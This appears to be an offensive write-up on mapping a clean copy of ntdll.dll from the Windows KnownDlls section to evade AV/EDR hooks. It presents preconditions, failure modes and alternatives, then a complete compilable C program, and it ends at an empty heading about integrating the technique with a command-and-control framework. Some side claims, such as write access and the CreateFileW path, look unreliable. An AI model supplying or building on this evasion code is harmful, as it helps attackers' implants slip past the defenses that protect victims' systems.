## Technique Overview
The technique obtains a handle to the pre‑mapped system DLL `ntdll.dll` by opening the KnownDlls section object `\KnownDlls\ntdll.dll` via the native syscall `NtOpenSection`. After acquiring the handle, `NtMapViewOfSection` maps the section into the attacker’s process, providing direct read (or write) access to the original module without triggering the normal loader. This bypasses user‑mode DLL load notifications and reduces the chance of detection by AV/EDR products.

## Preconditions and Primitive
- **Privileges:** No special privilege is required for SECTION_MAP_READ; any user‑mode process can open the KnownDlls section for read access. Writing requires higher rights (e.g., SYSTEM).  
- **APIs/Primitives:**  
  1. `RtlInitUnicodeString` – builds the `UNICODE_STRING` for the object name.  
  2. `InitializeObjectAttributes` – creates `OBJECT_ATTRIBUTES`.  
  3. `NtOpenSection` – opens the KnownDlls section.  
  4. `NtMapViewOfSection` – maps the section into the process address space.  
  5. `NtUnmapViewOfSection` and `NtClose` – clean up.  
- **Failure Modes:** Incorrect `UNICODE_STRING` length, missing OBJ_CASE_INSENSITIVE flag, or using an invalid access mask causes `STATUS_INVALID_PARAMETER` or `STATUS_ACCESS_DENIED`.  
- **Alternative Approaches:**  
  - Use `CreateFileW` on the NT path `\\.\KnownDlls\ntdll.dll` (more noisy).  
  - Use `NtCreateFile` with the symbolic link `\??\KnownDlls\ntdll.dll` (requires handling of reparse points). Both increase the audit surface compared to the direct `NtOpenSection` method.

## Working Code and Payload
```c
/* Compile with: cl /Zi /EHsc /MT /link ntdll.lib */
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

int wmain(void)
{
    NTSTATUS status;
    HANDLE hSection = NULL;
    UNICODE_STRING usSectionName;
    OBJECT_ATTRIBUTES objAttr;

    /* 1. Build the NT path to the KnownDlls entry */
    RtlInitUnicodeString(&usSectionName, L"\\KnownDlls\\ntdll.dll");
    InitializeObjectAttributes(&objAttr,
                               &usSectionName,
                               OBJ_CASE_INSENSITIVE,
                               NULL,
                               NULL);

    /* 2. Open the section with read access */
    status = NtOpenSection(&hSection,
                           SECTION_MAP_READ,
                           &objAttr);
    if (!NT_SUCCESS(status)) {
        wprintf(L"NtOpenSection failed: 0x%08X\n", status);
        return 1;
    }

    /* 3. Map the section into the current process */
    PVOID baseAddress = NULL;
    SIZE_T viewSize = 0;               // 0 -> map whole section
    LARGE_INTEGER offset;
    offset.QuadPart = 0;               // start at beginning

    status = NtMapViewOfSection(hSection,
                                GetCurrentProcess(),
                                &baseAddress,
                                0,
                                0,
                                &offset,
                                &viewSize,
                                ViewUnmap,
                                0,
                                PAGE_READONLY);
    if (!NT_SUCCESS(status)) {
        wprintf(L"NtMapViewOfSection failed: 0x%08X\n", status);
        NtClose(hSection);
        return 1;
    }

    wprintf(L"ntdll.dll mapped at %p (size %llu bytes)\n",
            baseAddress, (unsigned long long)viewSize);

    /* Example: print the first four bytes of the original ntdll */
    BYTE *p = (BYTE *)baseAddress;
    wprintf(L"First bytes: %02X %02X %02X %02X\n",
            p[0], p[1], p[2], p[3]);

    /* 4. Cleanup */
    NtUnmapViewOfSection(GetCurrentProcess(), baseAddress);
    NtClose(hSection);
    return 0;
}
```

## Adaptix C2 Integration
